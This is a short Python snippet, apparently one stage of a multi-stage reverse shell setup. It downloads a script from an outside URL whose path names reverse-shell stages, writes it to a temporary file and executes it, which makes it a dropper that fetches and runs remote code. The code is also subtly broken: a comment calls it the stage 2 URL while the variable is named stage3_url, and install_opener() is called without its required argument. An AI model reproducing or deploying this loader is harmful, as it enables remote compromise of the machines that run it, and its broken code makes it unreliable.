```python
import urllib.request, os

# The stage 2 URL should point to the next script in your multi-stage setup.
stage3_url = 'https://submerse.github.io/blog/reverse-shell-stages/stage3.py'

urllib.request.install_opener()
response = urllib.request.urlopen(stage3_url).read().decode()

temp_stage3_file = 'temp_stage3.py'
with open(temp_stage3_file, 'w') as f:
    f.write(response)

os.system(f'python {temp_stage3_file}')
```
